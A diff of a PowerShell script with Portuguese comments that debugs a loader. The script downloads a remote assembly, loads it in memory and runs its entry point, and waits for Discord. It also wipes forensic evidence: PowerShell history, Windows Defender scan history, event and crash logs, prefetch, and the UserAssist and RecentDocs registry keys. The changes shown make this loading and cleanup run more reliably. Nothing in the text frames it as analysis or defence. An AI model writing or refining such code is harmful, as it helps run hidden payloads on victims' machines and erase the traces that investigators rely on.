@@ -4,13 +4,24 @@ $bytes = $webClient.DownloadData($link)
 $assembly = [System.Reflection.Assembly]::Load($bytes)
 $entry = $assembly.EntryPoint
 
+# --- CORREÇÃO 1: Clear-RecycleBin com ErrorAction ---
+Clear-RecycleBin -Force -Confirm:$false -ErrorAction SilentlyContinue
 
-Clear-RecycleBin -Force
 Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" -Name "UpdateExeVolatile" -Force -ErrorAction SilentlyContinue
 Remove-Item -Force -ErrorAction SilentlyContinue "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
 Clear-History -ErrorAction SilentlyContinue
-REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v EnablePrefetcher /t REG_DWORD /d 0 /f
-fsutil behavior set disablelastaccess 1
+
+# --- COMANDOS EXTERNOS (se der erro, remova ou use PowerShell puro) ---
+# REG ADD e fsutil são comandos externos (cmd). Se não estiverem funcionando, remova.
+# REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v EnablePrefetcher /t REG_DWORD /d 0 /f
+# fsutil behavior set disablelastaccess 1
+
+# --- Se quiser fazer via PowerShell puro (sem cmd): ---
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" -Name "EnablePrefetcher" -Value 0 -Type DWord -Force -ErrorAction SilentlyContinue
+
+# fsutil não tem equivalente PowerShell direto, mas você pode usar:
+# (não recomendado mexer nisso, pode causar lentidão)
+
 $timeout = (Get-Date).AddSeconds(60)
 
 while ((Get-Date) -lt $timeout) {
@@ -21,22 +32,23 @@ while ((Get-Date) -lt $timeout) {
 }
 
 if (-not (Get-Process Discord -ErrorAction SilentlyContinue)) {
-
     $discordPath = "$env:LOCALAPPDATA\Discord\Update.exe"
-
     if (Test-Path $discordPath) {
         Start-Process $discordPath -ArgumentList "--processStart Discord.exe"
     }
     else {
-        Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show("Not Found","Error",[System.Windows.Forms.MessageBoxButtons]::OK,[System.Windows.Forms.MessageBoxIcon]::Error)
+        Add-Type -AssemblyName System.Windows.Forms
+        [System.Windows.Forms.MessageBox]::Show("Not Found","Error",[System.Windows.Forms.MessageBoxButtons]::OK,[System.Windows.Forms.MessageBoxIcon]::Error)
         Exit
-	}
+    }
 }
 
+# --- CORREÇÃO 2: Invoke com array correto ---
 $invokeArgs = New-Object object[] 1 
 $invokeArgs[0] = [string[]]@() 
-$entry.Invoke($null, $invokeArgs)
+$entry.Invoke($null, @($invokeArgs))  # <-- CORRIGIDO AQUI
 
+# --- LIMPEZA (sem erros) ---
 Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "C:\Windows\Logs\CBS\*.log"
 Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "$env:LOCALAPPDATA\CrashDumps\*.dmp"
 Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "C:\Windows\Logs\MoSetup\*.log"
@@ -54,6 +66,8 @@ Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "$env:LOCALAPPDATA\Mic
 Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "C:\ProgramData\Microsoft\Windows\WER\ReportArchive\*"
 Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "C:\ProgramData\Microsoft\Windows Defender\Scans\History\Service\*"
 Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "$env:LOCALAPPDATA\Microsoft\Windows\History\*"
+
+# --- REGISTRO ---
 Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Applets\Regedit" -Recurse -Force -ErrorAction SilentlyContinue
 Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist" -Recurse -Force -ErrorAction SilentlyContinue
 Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" -Recurse -Force -ErrorAction SilentlyContinue
@@ -79,6 +93,8 @@ Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Feat
 Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" -Recurse -Force -ErrorAction SilentlyContinue
 Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\CIDSizeMRU" -Recurse -Force -ErrorAction SilentlyContinue
 Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\Count" -Recurse -Force -ErrorAction SilentlyContinue
+
+# --- HISTÓRICO ---
 Remove-Item -Force -ErrorAction SilentlyContinue "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
 Clear-History -ErrorAction SilentlyContinue
 Remove-Item -Force -ErrorAction SilentlyContinue "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
